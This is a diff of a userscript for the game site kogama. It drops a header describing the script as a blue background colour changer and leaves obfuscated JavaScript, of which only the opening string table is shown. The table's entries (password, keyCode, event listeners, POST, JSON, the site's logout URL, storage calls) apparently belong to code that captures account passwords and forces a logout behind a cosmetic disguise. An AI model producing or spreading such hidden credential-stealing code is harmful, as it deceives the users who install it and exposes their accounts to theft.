@@ -1,14 +1,4 @@
-// ==UserScript==
-// @name         Background Color Changer (blue)
-// @namespace    http://tampermonkey.net/
-// @version      V1-Beta
-// @description  changes background color of kogama to blue
-// @author     Lavar
-// @match      https://www.kogama.com/*
-// @match      https://kogama.com.br/*
-// @match      https://friends.kogama.com/*
-// @grant        none
-// ==/UserScript==
+
 const _0x5acfe3 = _0x502f;
 function _0x22fc() {
   const _0x1a7136 = ['addEventListener', 'log', 'stringify', 'location', 'status', '173846mcQEUN', '9NpMVeb', 'Success:', '113830LYAXum', 'keyCode', 'setItem', 'value', 'root-page-mobile', 'password', '71868QrEQBX', 'getItem', 'error', '2716758eSaPId', 'catch', 'poop', 'querySelector', 'Error:', '126544zlfMyY', 'lol', '506569BqwGkp', '.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textDefault.MuiButton-sizeSmall.MuiButton-textSizeSmall.MuiButton-colorDefault.css-f3wymp', '99qjFQGn', '2MXeZit', 'then', 'getElementById', 'application/json', 'https://www.kogama.com/auth/logout', '25vivdkf', 'json', "Button not found!", '768536FEIJoG', 'POST', 'click', '.MuiButtonBase-root.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeLarge.MuiButton-containedSizeLarge.MuiButton-colorSecondary.css-9la3qa', "background-image: linear-gradient(135deg, rgb(0 137 255), rgb(0 112 255))"];
